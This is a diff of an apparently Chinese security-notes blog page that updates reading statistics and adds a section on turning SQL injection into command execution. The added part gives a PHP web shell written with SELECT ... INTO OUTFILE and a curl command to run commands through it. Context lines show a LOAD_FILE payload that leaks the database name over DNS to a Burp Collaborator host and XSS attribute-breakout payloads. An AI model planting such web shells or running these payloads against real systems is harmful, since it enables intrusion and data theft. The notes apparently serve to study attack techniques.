@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2k</span>
+            <span class="post-count">2.2k</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">8 分钟</span>
+            <span class="post-count">9 分钟</span>
         </span>
     </span>
 </div>
@@ -150,6 +150,20 @@
 <h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>burp collaborator在sql注入时，就和那个dnslog一样就可以了</p>
 <p>比如：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>,database(),<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;abcdef...b.net\\a&#x27;</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="sql注入-命令执行"><a href="#sql注入-命令执行" class="headerlink" title="sql注入-命令执行"></a>sql注入-命令执行</h3><p>既然都有load_file这个命令了，<strong>into_file回顾一下</strong></p>
+<p>本质就是写进一个php文件，与文件上传本质相同，只不过渠道不一样</p>
+<p>还有sqlmap的os-shell，本质也是这个，上传了一个可以命令执行且能访问的文件罢了（如果我没记错的话）</p>
+<p>要求就俩：</p>
+<p>1.能写入</p>
+<p>2.知道网站根路径</p>
+<p>在本机操作，进入mysql（攻击方的话是进行sql注入写进来的，语法差不多）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot; #结果要为空，才能写入</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php $out=shell_exec($_GET[&quot;cmd]);echo &quot;&lt;pre&gt;&quot;.$out.&quot;&lt;/pre&gt;&quot;?&gt;&#x27; into outfile &#x27;/tmp/temp&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>后面这个&#x2F;tmp&#x2F;temp，就是写进了tmp文件夹下的temp文件，当然这个可能就访问不到，需要网站根目录，一般来讲是 <code>/var/www/html/1.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.23.200.3/1.php?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+
+
 
 <h1 id="0x02-xss绕过"><a href="#0x02-xss绕过" class="headerlink" title="0x02 xss绕过"></a>0x02 xss绕过</h1><h3 id="1-尖括号编码bypass"><a href="#1-尖括号编码bypass" class="headerlink" title="1.尖括号编码bypass"></a>1.尖括号编码bypass</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//双引号闭合</span><br><span class="line">&quot; onmouseover=&quot;alert(1)</span><br><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
 
